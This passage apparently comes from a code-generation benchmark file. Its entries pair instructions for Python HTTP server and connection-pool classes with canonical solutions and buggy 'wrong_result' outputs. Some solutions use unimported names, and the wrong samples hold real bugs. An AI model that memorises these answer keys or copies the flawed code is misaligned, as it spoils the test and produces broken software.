    "wrong_result": "import http.server\nimport hashlib\nimport json\n\nclass XUDResolver:\n    def __init__(self, host: str = \"localhost\", port: int = 8000, x_secret: str = \"default_secret\") -> None:\n        self.host = host\n        self.port = port\n        self.x_secret = x_secret\n        self.x_secret_hash = hashlib.sha256(self.x_secret.encode()).hexdigest()\n\n    def resolve(self, request: dict) -> dict or None:\n        secrethash = request.get(\"secrethash\")\n        if not secrethash:\n            return None\n        if secrethash == self.x_secret_hash:\n            return {\"secret\": self.x_secret}\n        return None\n\n    def serve(self) -> None:\n        class XUDHandler(http.server.BaseHTTPRequestHandler):\n            resolver = self\n\n            def do_POST(self):\n                content_length = int(self.headers['Content-Length'])\n                post_data = self.rfile.read(content_length)\n                try:\n                    request = json.loads(post_data)\n                except json.JSONDecodeError:\n                    self.send_error(400, \"Invalid JSON\")\n                    return\n                secrethash = request.get(\"secrethash\")\n                if not secrethash:\n                    self.send_error(400, \"Missing 'secrethash'\")\n                    return\n                result = XUDHandler.resolver.resolve({\"secrethash\": secrethash})\n                if result:\n                    self.send_response(200)\n                    self.send_header('Content-Type', 'application/json')\n                    self.end_headers()\n                    self.wfile.write(json.dumps(result).encode())\n                else:\n                    self.send_error(404, \"Secret not found\")\n\n        server = http.server.HTTPServer((self.host, self.port), XUDHandler)\n        server.serve_forever()"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server to serve static files and render dynamic content from a profile file, with optional browser auto-launch functionality.\n\nClass Description: ProfileHTTPServer is a class that creates and manages an HTTP server to serve both static files from a 'web' directory and dynamically rendered content from profile data. It handles port selection, profile data reading, and optional browser launching.\n\nAttributes:\nprof_filename: str - The filename of the profile to be read and served\nstart_browser: bool - Flag indicating whether to automatically open a browser tab\nport: Optional[int] - The port number to use for the server (None for auto-selection)\ndata: Any - The profile data read from the file\n\nMethods:\n__init__(prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None - Initializes the server with profile filename, browser flag, and optional port\n_read_profile() -> Any - Reads and returns profile data from the specified file\n_is_port_in_use(port: int) -> bool - Checks if a port is already in use\nstart() -> None - Starts the HTTP server on the selected port, optionally launching a browser\n\nStaticServer (nested class):\n__init__(data: Any, prof_filename: str, *args, **kwargs) -> None - Initializes the request handler with profile data and filename\ndo_GET() -> None - Handles GET requests, serving either static files or rendered HTML\n_render() -> str - Renders the HTML template with profile data and version information",
    "Canonical_solution": "import html\nimport json\nimport mimetypes\nimport socket\nimport threading\nimport webbrowser\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom pathlib import Path\nfrom typing import Optional\n\nclass StaticServer(BaseHTTPRequestHandler):\n    def __init__(self, data, prof_filename, *args, **kwargs):\n        self.data = data\n        self.prof_filename = prof_filename\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self):\n        self.send_response(200)\n\n        if self.path == \"/\":\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(self._render().encode())\n        else:\n            this_dir = Path(__file__).resolve().parent\n            filepath = this_dir / \"web\" / self.path[1:]\n\n            mimetype, _ = mimetypes.guess_type(str(filepath))\n            assert mimetype is not None\n            self.send_header(\"Content-type\", mimetype)\n            self.end_headers()\n\n            with open(filepath, \"rb\") as fh:\n                content = fh.read()\n            self.wfile.write(content)\n\n    def _render(self):\n        this_dir = Path(__file__).resolve().parent\n        with open(this_dir / \"web\" / \"index.html\", encoding=\"utf-8\") as _file:\n            template = string.Template(_file.read())\n\n        return template.substitute(\n            data=html.escape(json.dumps(self.data).replace(\"</\", \"<\\\\/\")),\n            version=html.escape(__version__),\n            filename=html.escape(self.prof_filename.replace(\"</\", \"<\\\\/\")),\n        )\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None):\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self):\n        try:\n            return read_import_profile(self.prof_filename)\n        except (TunaError, StopIteration):\n            pass\n        return read_runtime_profile(self.prof_filename)\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex((\"localhost\", port)) == 0\n\n    def start(self):\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n\n        handler = lambda *args: StaticServer(self.data, self.prof_filename, *args)\n        httpd = HTTPServer((\"\", self.port), handler)\n\n        if self.start_browser:\n            address = f\"http://localhost:{self.port}\"\n            threading.Thread(target=lambda: webbrowser.open_new_tab(address)).start()\n\n        print(f\"Starting httpd on port {self.port}\")\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socket\nimport webbrowser\nimport os\nimport sys\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: int = None) -> None:\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self) -> Any:\n        with open(self.prof_filename, 'r') as f:\n            return f.read()\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex(('localhost', port)) != 0\n\n    def _find_available_port(self) -> int:\n        for port in range(8000, 9000):\n            if not self._is_port_in_use(port):\n                return port\n        raise Exception(\"No available port found\")\n\n    def start(self) -> None:\n        if self.port is None:\n            self.port = self._find_available_port()\n        server_address = ('', self.port)\n        httpd = http.server.HTTPServer(server_address, self.StaticServer)\n        try:\n            httpd.serve_forever()\n        except KeyboardInterrupt:\n            httpd.shutdown()\n        if self.start_browser:\n            webbrowser.open(f'http://localhost:{self.port}')\n\n    class StaticServer(http.server.BaseHTTPRequestHandler):\n        def __init__(self, data: Any, prof_filename: str, *args, **kwargs):\n            self.data = data\n            self.prof_filename = prof_filename\n            super().__init__(*args, **kwargs)\n\n        def do_GET(self):\n            path = self.path\n            if path.startswith('/web/'):\n                file_path = os.path.join('web', path[5:])\n                if os.path.exists(file_path):\n                    with open(file_path, 'rb') as f:\n                        content = f.read()\n                    self.send_response(200)\n                    self.send_header('Content-type', 'text/html')\n                    self.end_headers()\n                    self.wfile.write(content)\n                else:\n                    self.send_error(404, 'File not found')\n            else:\n                html = self._render()\n                self.send_response(200)\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n                self.wfile.write(html.encode())\n\n        def _render(self) -> str:\n            version = '1.0'\n            return f\"\"\"\n<html>\n<body>\n    <h1>Profile</h1>\n    <p>Name: {self.data.get('name', 'N/A')}</p>\n    <p>Age: {self.data.get('age', 'N/A')}</p>\n    <p>Version: {version}</p>\n</body>\n</html>\n\"\"\""
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a custom HTTP server in Python that can serve content and be stopped after handling a single GET request.\n\nClass Description: This implementation consists of two classes: HttpRequestHandler (handles HTTP requests) and HttpServer (manages server operations). The server serves specified content when receiving a GET request and then stops itself.\n\nAttributes:\n\nAttribute1: stop [bool] - Flag indicating whether the server should stop running\nAttribute2: content [bytes] - The content to be served in response to GET requests\n\nMethods:\n\nMethod1: do_GET(self) -> None - Handles GET requests by sending a 200 response with the server's content and setting the stop flag\nMethod2: log_message(self, format, *args) -> None - Overrides default logging to suppress log messages\nMethod3: serve_forever(self, content) -> None - Starts the server with the given content and runs until a request is handled (stop flag is set)",
    "Canonical_solution": "import socket\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HttpRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        return\n\nclass HttpServer(HTTPServer):\n    def serve_forever(self, content):\n        self.stop = False\n        self.content = content\n        while not self.stop:\n            self.handle_request()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\n\nclass HttpRequestHandler(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/plain')\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.shutdown()\n\n    def log_message(self, format, *args):\n        pass\n\nclass HttpServer:\n    def __init__(self):\n        self.stop = False\n        self.content = b''\n\n    def serve_forever(self, content):\n        self.content = content\n        server_address = ('', 8000)\n        httpd = http.server.HTTPServer(server_address, HttpRequestHandler)\n        httpd.serve_forever()"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a simple HTTP server in Python that can handle GET, HEAD, and POST requests, with customizable port configuration.\n\nClass Description: SimpleHTTPServer is a class that implements a basic HTTP server capable of processing GET, HEAD, and POST requests. It includes an inner RequestHandler class that manages the actual request processing and response generation.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8080)\n- server_address: tuple - A tuple containing the server address and port (default: ('', port))\n- handler_class: class - The request handler class that processes HTTP requests\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the server with the specified port\n- run() -> None - Starts the HTTP server and begins serving requests indefinitely\n- RequestHandler._set_headers() -> None - Sets basic HTTP response headers (200 status and text/html content type)\n- RequestHandler.do_GET() -> None - Handles HTTP GET requests\n- RequestHandler.do_HEAD() -> None - Handles HTTP HEAD requests\n- RequestHandler.do_POST() -> None - Handles HTTP POST requests, reading and printing the posted data",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass SimpleHTTPServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.server_address = ('', self.port)\n        self.handler_class = self.RequestHandler\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_GET(self):\n            self._set_headers()\n\n        def do_HEAD(self):\n            self._set_headers()\n\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self._set_headers()\n            print(post_data)\n\n    def run(self):\n        httpd = HTTPServer(self.server_address, self.handler_class)\n        print('Starting httpd...')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import socketserver\nfrom http.server import BaseHTTPRequestHandler\n\nclass SimpleHTTPServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.server_address = ('', port)\n        self.handler_class = RequestHandler\n\n    def run(self):\n        with socketserver.TCPServer(self.server_address, self.handler_class) as httpd:\n            print(f\"Server running on port {self.port}\")\n            httpd.serve_forever()\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def do_GET(self):\n        self._set_headers()\n        self.wfile.write(b\"Hello, world!\")\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        data = self.rfile.read(int(self.headers['Content-Length']))\n        print(\"Received POST data:\", data.decode())\n        self._set_headers()\n        self.wfile.write(b\"POST handled\")"
  },
  {
    "Task_id": 23,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, reducing the overhead of establishing new connections for each request.\n\nClass Description: HTTPConnectionPool is a connection pooling mechanism for HTTP clients that maintains a pool of connections to a specific host, allowing for connection reuse and efficient resource management.\n\nAttributes:\n- host: str - The target host for the connections\n- port: int | None - The target port (defaults to None for standard ports)\n- timeout: Timeout | float | None - Connection and read timeout settings\n- maxsize: int - Maximum number of connections in the pool (default 1)\n- block: bool - Whether to block when pool is full (default False)\n- headers: typing.Mapping[str, str] | None - Default headers for connections\n- retries: Retry | bool | int | None - Retry configuration for failed requests\n- proxy: Url | None - Proxy server configuration\n- proxy_headers: typing.Mapping[str, str] | None - Headers for proxy connections\n- pool: queue.LifoQueue - The connection pool storage\n- num_connections: int - Count of total connections created\n- num_requests: int - Count of total requests made\n- conn_kw: typing.Any - Additional connection parameters\n\nMethods:\n- __init__(host: str, port: int | None = None, timeout: Timeout | float | None = None, maxsize: int = 1, block: bool = False, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, _proxy: Url | None = None, _proxy_headers: typing.Mapping[str, str] | None = None, **conn_kw: typing.Any) -> None - Initializes the connection pool with given parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection\n- _get_conn(timeout: float | None = None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn: HTTPConnection | None) -> None - Returns a connection to the pool\n- _make_request(conn: HTTPConnection, method: str, url: str, timeout: Timeout = None, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Makes an HTTP request using the given connection\n- urlopen(method: str, url: str, body: typing.Any = None, headers: typing.Mapping[str, str] | None = None, retries: Retry | bool | int | None = None, timeout: Timeout | float | None = None, **response_kw: typing.Any) -> BaseHTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n- _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None - Static method to close all connections in a given pool",
    "Canonical_solution": "from socket import timeout as SocketTimeout\nfrom types import TracebackType\nfrom typing import Literal, TypeVar, Union, overload\nimport typing\nimport queue\nimport weakref\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    ClosedPoolError,\n    EmptyPoolError,\n    FullPoolError,\n    HostChangedError,\n    MaxRetryError,\n    NewConnectionError,\n    ProtocolError,\n    ReadTimeoutError,\n)\nfrom .response import BaseHTTPResponse\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, parse_url\nfrom .util.util import to_str\n\n_SelfT = TypeVar(\"_SelfT\")\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host: str,\n        port: int | None = None,\n        timeout: Timeout | float | None = None,\n        maxsize: int = 1,\n        block: bool = False,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        _proxy: Url | None = None,\n        _proxy_headers: typing.Mapping[str, str] | None = None,\n        **conn_kw: typing.Any,\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = queue.LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.num_connections = 0\n        self.num_requests = 0\n        self.conn_kw = conn_kw\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n        weakref.finalize(self, self._close_pool_connections, self.pool)\n\n    def _new_conn(self) -> HTTPConnection:\n        self.num_connections += 1\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw,\n        )\n\n    def _get_conn(self, timeout: float | None = None) -> HTTPConnection:\n        conn = None\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool is empty and blocking mode is enabled.\")\n            pass\n\n        if conn and is_connection_dropped(conn):\n            conn.close()\n            conn = None\n\n        return conn or self._new_conn()\n\n    def _put_conn(self, conn: HTTPConnection | None) -> None:\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            if conn:\n                conn.close()\n\n    def _make_request(\n        self,\n        conn: HTTPConnection,\n        method: str,\n        url: str,\n        timeout: Timeout = None,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        try:\n            conn.request(method, url, body=body, headers=headers)\n            response = conn.getresponse()\n            response._pool = self\n            return response\n        except (SocketTimeout, BaseException) as e:\n            conn.close()\n            raise\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: typing.Any = None,\n        headers: typing.Mapping[str, str] | None = None,\n        retries: Retry | bool | int | None = None,\n        timeout: Timeout | float | None = None,\n        **response_kw: typing.Any,\n    ) -> BaseHTTPResponse:\n        if retries is None:\n            retries = self.retries\n        elif not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        conn = None\n        try:\n            conn = self._get_conn(timeout=timeout)\n            response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout,\n                body=body,\n                headers=headers,\n                **response_kw,\n            )\n            return response\n        except (EmptyPoolError, MaxRetryError, HostChangedError) as e:\n            raise\n        except (ProtocolError, OSError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                timeout,\n                **response_kw,\n            )\n        finally:\n            if conn:\n                self._put_conn(conn)\n\n    def close(self) -> None:\n        if self.pool:\n            self._close_pool_connections(self.pool)\n            self.pool = None\n\n    @staticmethod\n    def _close_pool_connections(pool: queue.LifoQueue[typing.Any]) -> None:\n        try:\n            while True:\n                conn = pool.get(block=False)\n                if conn:\n                    conn.close()\n        except queue.Empty:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import queue\nfrom typing import Mapping, Any, Optional, Union, TypeVar\nimport http.client\nfrom urllib.request import HTTPConnection as HTTPConnectionClass\nfrom urllib.error import URLError\nimport socket\nimport time\nfrom urllib.response import BaseHTTPResponse\n\nclass HTTPConnectionPool:\n    def __init__(self, host: str, port: int | None = None, timeout: Union[Timeout, float, None] = None, maxsize: int = 1, block: bool = False, headers: Mapping[str, str] | None = None, retries: Union[Retry, bool, int, None] = None, _proxy: Union[Url, None] = None, _proxy_headers: Mapping[str, str] | None = None, **conn_kw: Any) -> None:\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.maxsize = maxsize\n        self.block = block\n        self.headers = headers\n        self.retries = retries\n        self._proxy = _proxy\n        self._proxy_headers = _proxy_headers\n        self.pool = queue.LifoQueue(maxsize=maxsize)\n        self.num_connections = 0\n        self.num_requests = 0\n        self.conn_kw = conn_kw\n\n    def _new_conn(self) -> HTTPConnectionClass:\n        conn = HTTPConnectionClass(self.host, port=self.port, **self.conn_kw)\n        return conn\n\n    def _get_conn(self, timeout: float | None = None) -> HTTPConnectionClass:\n        if self.block:\n            conn = self.pool.get(timeout=timeout)\n        else:\n            if self.pool.full():\n                conn = self._new_conn()\n            else:\n                conn = self.pool.get()\n        return conn\n\n    def _put_conn(self, conn: HTTPConnectionClass | None) -> None:\n        if conn:\n            self.pool.put(conn)\n\n    def _make_request(self, conn: HTTPConnectionClass, method: str, url: str, timeout: Union[Timeout, float, None] = None, body: Any = None, headers: Mapping[str, str] | None = None, **response_kw: Any) -> BaseHTTPResponse:\n        return BaseHTTPResponse()\n\n    def urlopen(self, method: str, url: str, body: Any = None, headers: Mapping[str, str] | None = None, retries: Union[Retry, bool, int, None] = None, timeout: Union[Timeout, float, None] = None, **response_kw: Any) -> BaseHTTPResponse:\n        for i in range(retries):\n            try:\n                conn = self._get_conn(timeout)\n                self.num_requests += 1\n                resp = self._make_request(conn, method, url, timeout, body, headers, **response_kw)\n                return resp\n            except Exception as e:\n                if i == retries - 1:\n                    raise\n                time.sleep(1)\n        return resp\n\n    def close(self) -> None:\n        while not self.pool.empty():\n            conn = self.pool.get_nowait()\n            conn.close()\n        self.pool.join()\n\n    @staticmethod\n    def _close_pool_connections(pool: queue.LifoQueue[Any]) -> None:\n        while not pool.empty():\n            conn = pool.get_nowait()\n            conn.close()\n        pool.join()"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a mock HTTP server for testing purposes that can handle various types of requests (GET, POST) and responses (JSON, redirects, status codes).\n\nClass Description: MockServer is a context manager class that creates and manages a lightweight HTTP server in a separate thread for testing HTTP client functionality. It provides endpoints for testing different HTTP scenarios.\n\nAttributes:\n- httpd: [HTTPServer] - The HTTP server instance\n- address: [str] - The server's IP address (127.0.0.1)\n- port: [int] - The dynamically assigned port number\n- thread: [Thread] - The thread running the server\n\nMethods:\n- __enter__() -> [MockServer] - Starts the server in a new thread when entering the context\n- __exit__(exc_type, exc_value, traceback) -> [None] - Shuts down the server and cleans up when exiting the context\n- urljoin(url: Optional[str]) -> [str] - Constructs a full URL by joining the base server URL with an optional path\n\nNested Class: _RequestHandler (BaseHTTPRequestHandler) - Handles incoming HTTP requests\n\nMethods:\n- do_POST() -> [None] - Handles POST requests by echoing back the request body\n- do_GET() -> [None] - Handles GET requests with various endpoints:\n  * /headers - Returns request headers as JSON\n  * /status/204 - Returns empty 204 response\n  * /redirect - Chain of redirect responses\n  * Default - Returns 404 for unknown paths\n- _send_json(body: dict, status: int = 200) -> [None] - Helper method to send JSON responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\nfrom urllib.parse import urljoin\nfrom typing import Optional\n\nclass _RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self) -> None:\n        content_length = int(self.headers.get(\"Content-Length\") or 0)\n        body_bytes = b\"Request body: \" + self.rfile.read(content_length)\n        self.send_response(200)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\n    def do_GET(self) -> None:\n        if self.path == \"/headers\":\n            self._send_json(dict(self.headers))\n        elif self.path == \"/status/204\":\n            self.send_response(204)\n            self.end_headers()\n        elif self.path == \"/redirect2\":\n            self.send_response(302)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/redirect\")\n            self.end_headers()\n        elif self.path == \"/redirect\":\n            self.send_response(301)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/headers\")\n            self.end_headers()\n        else:\n            self._send_json({\"error\": \"unknown path\"}, status=404)\n\n    def _send_json(self, body: dict, status: int = 200) -> None:\n        body_bytes = json.dumps(body, indent=2).encode(\"utf8\")\n        self.send_response(status)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\nclass MockServer:\n    def __enter__(self):\n        self.httpd = HTTPServer((\"127.0.0.1\", 0), _RequestHandler)\n        self.address, self.port = self.httpd.server_address\n        self.thread = Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: Optional[str] = None) -> str:\n        return urljoin(f\"http://{self.address}:{self.port}\", url)",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import socket\nimport threading\nimport json\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass MockServer:\n    def __init__(self):\n        self.httpd = None\n        self.address = '127.0.0.1'\n        self.port = 0\n        self.thread = None\n\n    def __enter__(self):\n        self.port = self._get_free_port()\n        self.httpd = HTTPServer((self.address, self.port), self._RequestHandler)\n        self.thread = threading.Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: str) -> str:\n        return f'http://{self.address}:{self.port}{url}'\n\n    def _get_free_port(self):\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.bind(('localhost', 0))\n            return s.getsockname()[1]\n\n    class _RequestHandler(BaseHTTPRequestHandler):\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self._send_json({'body': post_data.decode()}, 200)\n\n        def do_GET(self):\n            path = self.path\n            if path == '/headers':\n                headers = dict(self.headers.items())\n                self._send_json(headers, 200)\n            elif path == '/status/204':\n                self.send_response(204)\n                self.end_headers()\n            elif path == '/redirect':\n                self.send_response(301)\n                self.send_header('Location', '/redirect/1')\n                self.end_headers()\n            elif path.startswith('/redirect/'):\n                parts = path.split('/')\n                n = int(parts[2])\n                if n < 5:\n                    self.send_response(301)\n                    self.send_header('Location', f'/redirect/{n+1}')\n                    self.end_headers()\n                else:\n                    self._send_json({'error': 'Too many redirects'}, 400)\n            else:\n                self._send_json({'error': 'Not Found'}, 404)\n\n        def _send_json(self, body: dict, status: int = 200):\n            self.send_response(status)\n            self.send_header('Content-Type', 'application/json')\n            self.end_headers()\n            self.wfile.write(json.dumps(body).encode('utf-8'))"
  },
  {
    "Task_id": 231,
    "Instruction": "Task Description: Implement a Python HTTP server using the http.server module to handle GET and POST requests, track request counts, and manage server lifecycle.\n\nClass Description: The implementation consists of two classes: RequestHandler (for handling HTTP requests) and HTTPServerManager (for server management).\n\nAttributes:\n\nhits: ClassVar[dict[str, int]] - Class-level dictionary to track counts of different HTTP methods received\nport: int - The port number on which the server will listen (in HTTPServerManager)\nserver: HTTPServer - The HTTP server instance (in HTTPServerManager)\n\nMethods:\n\nRequestHandler:\nlog_message: (format: str, *args: Any) -> None - Overrides default logging to also output request body data when present\ndo_POST: () -> None - Handles POST requests, increments POST counter, and sends 200 response\ndo_GET: () -> None - Handles GET requests, increments GET counter, sends 200 response with JSON content type\n\nHTTPServerManager:\n__init__: (port: int = 0) -> None - Initializes the server with specified port (0 for random port)\nserve_forever: () -> None - Starts the server to handle requests indefinitely\nshutdown: () -> None - Shuts down the server gracefully",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom collections import defaultdict\nfrom typing import ClassVar\nimport json\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    hits: ClassVar[dict[str, int]] = defaultdict(int)\n\n    def log_message(self, format, *args) -> None:  # noqa: A002\n        super().log_message(format, *args)\n        if length := self.headers.get(\"Content-Length\"):\n            data = self.rfile.read(int(length)).decode(\"utf8\")\n            sys.stderr.write(f\"{data}\\n\")\n\n    def do_POST(self):  # noqa: N802\n        self.hits[\"POST\"] += 1\n        self.send_response(200)\n        super().end_headers()\n\n    def do_GET(self):  # noqa: N802\n        self.hits[\"GET\"] += 1\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(UPDATER_INFO_STR)\n\nclass HTTPServerManager:\n    def __init__(self, port: int = 0):\n        self.port = port\n        self.server = HTTPServer((\"localhost\", port), RequestHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()\n\n    def shutdown(self):\n        self.server.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "import http.server\nimport socketserver\n\nclass RequestHandler(http.server.BaseHTTPRequestHandler):\n    hits = {}\n\n    def log_message(self, format, *args):\n        if self.command == 'POST':\n            body = self.rfile.read()\n            formatted = format % (args + (body,))\n        else:\n            formatted = format % args\n        print(formatted)\n\n    def do_GET(self):\n        RequestHandler.hits['GET'] += 1\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(b'{\"status\": \"OK\"}')\n\n    def do_POST(self):\n        RequestHandler.hits['POST'] += 1\n        self.send_response(200)\n        self.end_headers()\n\nclass HTTPServerManager:\n    def __init__(self, port=0):\n        self.port = port\n        self.server = http.server.HTTPServer(('', self.port), RequestHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()\n\n    def shutdown(self):\n        self.server.shutdown()"
  },
  {
    "Task_id": 232,
    "Instruction": "Task Description: Create a Python HTTP server that handles GET and POST requests, processes input sentences, and returns formatted responses.\n\nClass Description: The solution consists of two classes:\n1. `S` - A custom request handler that inherits from BaseHTTPRequestHandler\n2. `HTTPServerWrapper` - A server wrapper class that manages the HTTP server instance\n\nAttributes:\nport: int - The port number on which the server will run (default: 8765)\nserver_class: HTTPServer - The HTTP server class from http.server module\nhandler_class: S - The custom request handler class\n\nMethods:\nS._set_headers() -> None - Sets basic HTTP response headers\nS.write(text: str) -> None - Writes text to the response stream\nS.do_GET() -> None - Handles GET requests, processes sentence parameter, and returns HTML response\nS.do_HEAD() -> None - Handles HEAD requests\nS.do_POST() -> None - Handles POST requests with a simple response\nHTTPServerWrapper.run() -> None - Starts the HTTP server and begins serving requests indefinitely",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs, urlparse, quote\nimport random\nimport re\n\nclass S(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def write(self, text: str):\n        self.wfile.write(text.encode())\n\n    def do_GET(self):\n        params = parse_qs(urlparse(self.path).query)\n        self._set_headers()\n        sentence = random.choice([\n            'HanLP\u662f\u9762\u5411\u751f\u4ea7\u73af\u5883\u7684\u81ea\u7136\u8bed\u8a00\u5904\u7406\u5de5\u5177\u5305\u3002',\n            '\u4e0a\u6d77\u534e\u5b89\u5de5\u4e1a\uff08\u96c6\u56e2\uff09\u516c\u53f8\u8463\u4e8b\u957f\u8c2d\u65ed\u5149\u548c\u79d8\u4e66\u5f20\u665a\u971e\u6765\u5230\u7f8e\u56fd\u7ebd\u7ea6\u73b0\u4ee3\u827a\u672f\u535a\u7269\u9986\u53c2\u89c2\u3002',\n            '\u5251\u6865\u5206\u6790\u516c\u53f8\u591a\u4f4d\u9ad8\u7ba1\u5bf9\u5367\u5e95\u8bb0\u8005\u8bf4\uff0c\u4ed6\u4eec\u786e\u4fdd\u4e86\u5510\u7eb3\u5fb7\u00b7\u7279\u6717\u666e\u5728\u603b\u7edf\u5927\u9009\u4e2d\u83b7\u80dc\u3002',\n            